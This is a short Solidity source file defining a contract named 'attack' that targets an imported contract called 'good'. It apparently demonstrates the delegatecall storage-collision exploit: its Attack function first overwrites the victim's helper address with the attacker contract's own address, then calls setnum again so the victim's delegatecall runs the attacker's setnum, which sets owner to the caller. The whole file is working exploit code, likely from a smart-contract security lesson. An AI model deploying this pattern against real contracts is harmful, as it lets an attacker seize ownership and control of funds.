//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "./good.sol";
contract attack{
    address public helper;
    address public owner;
    uint public num;
    good public Good;
    constructor(good _Good){
        Good=good(_Good);
    }
    function setnum(uint _num)public{
        owner=msg.sender;
    }
    function Attack() public{
        Good.setnum(uint(uint160(address(this))));
        Good.setnum(1);

    }


}